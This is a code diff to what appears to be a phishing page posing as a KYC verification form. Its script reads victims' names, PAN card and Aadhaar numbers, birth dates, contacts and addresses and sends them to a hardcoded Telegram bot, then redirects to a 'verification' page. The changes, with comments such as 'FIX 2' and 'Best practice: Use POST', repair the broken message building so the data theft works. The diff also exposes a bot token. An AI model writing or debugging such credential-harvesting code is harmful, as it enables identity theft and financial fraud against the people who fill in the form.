@@ -279,7 +279,7 @@
                 authenticating and verifying the physical / e-copy of the KYC documents.
             </div>
 
-            <button type="button" class="btn-agree">Agree and continue</button>
+            <button type="submit" class="btn-agree">Agree and continue</button>
         </form>
     </div>
 
@@ -302,62 +302,71 @@
 </p>
 
 
+<form id="telegramFormsss"> <button type="submit" class="btn-agree">Agree and continue</button>
+</form>
 
 <script>
 document.getElementById("telegramFormsss").addEventListener("submit", function(e) {
-  e.preventDefault();
+    e.preventDefault();
 
-  var name = document.getElementById("name").value;  
-  var middlename = document.getElementById("middlename").value;
-  var lastname = document.getElementById("lastname").value;
-  var pancard = document.getElementById("pancard").value;
-  var dateofbirth = document.getElementById("dateofbirth").value;
-  var aadhar = document.getElementById("aadhar").value;
-  var email = document.getElementById("email").value;
-  var mobile = document.getElementById("mobile").value;
-  var address = document.getElementById("address").value;
-  var pincode = document.getElementById("pincode").value;
-  var city = document.getElementById("city").value;
-  var state = document.getElementById("state").value;
-  var employmentstatus = document.getElementById("employmentstatus").value;
-  
+    // Get values
+    var name = document.getElementById("name").value;  
+    var middlename = document.getElementById("middlename").value;
+    var lastname = document.getElementById("lastname").value;
+    var pancard = document.getElementById("pancard").value;
+    var dateofbirth = document.getElementById("dateofbirth").value;
+    var aadhar = document.getElementById("aadhar").value;
+    var email = document.getElementById("email").value;
+    var mobile = document.getElementById("mobile").value;
+    var address = document.getElementById("address").value;
+    var pincode = document.getElementById("pincode").value;
+    var city = document.getElementById("city").value;
+    var state = document.getElementById("state").value;
+    var employmentstatus = document.getElementById("employmentstatus").value;
 
-  var botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";
-  var chatId = "1308711346";
+    var botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";
+    var chatId = "1308711346";
 
-  var message =
-    " New Form Submission\n\n" +
-    " Name: " + name + "\n" +
-    " Middle Name: " + middlename + "\n" +
-    " Last Name: " + lastname + "\n" +
-    " Pancard: " + pancard + "\n" +
-    " Dateofbirth: " + dateofbirth + "\n" +
-    " Aadhar: " + aadhar + "\n" +  
-    " Email: " + email + "\n" +
-    " Mobile: " + mobile + "\n" + 
-    " Address: " + address + "\n" +  
-    " Pincode: " + pincode;  
-    " City: " + city + "\n" + 
-    " State: " + state + "\n" +
-    " Employmentstatus: " + employmentstatus + "\n" +
+    // FIX 2: Fixed the broken string concatenation (removed the accidental semicolon)
+    var message = "🚀 New Form Submission\n\n" +
+        "Name: " + name + "\n" +
+        "Middle Name: " + middlename + "\n" +
+        "Last Name: " + lastname + "\n" +
+        "Pancard: " + pancard + "\n" +
+        "Date of Birth: " + dateofbirth + "\n" +
+        "Aadhar: " + aadhar + "\n" +  
+        "Email: " + email + "\n" +
+        "Mobile: " + mobile + "\n" + 
+        "Address: " + address + "\n" +   
+        "Pincode: " + pincode + "\n" + // Added + "\n" here
+        "City: " + city + "\n" + 
+        "State: " + state + "\n" +
+        "Employment: " + employmentstatus;
       
-  
-  var telegramURL =
-    "https://api.telegram.org/bot" + botToken +
-    "/sendMessage?chat_id=" + chatId +
-    "&text=" + encodeURIComponent(message);
+    var telegramURL = "https://api.telegram.org/bot" + botToken + "/sendMessage";
 
-  fetch(telegramURL)
+    // Best practice: Use POST for sending data
+    fetch(telegramURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+        })
+    })
     .then(response => {
-      // Redirect after sending data
-      window.location.href = "verification.html";  
+        if(response.ok) {
+            window.location.href = "verification.html";  
+        } else {
+            alert("Error from Telegram API");
+        }
     })
     .catch(error => {
-      alert("Failed to send data");   
+        console.error(error);
+        alert("Failed to send data. Check your internet connection.");    
     });
 });
 </script>
-
 
 </body>
 </html>
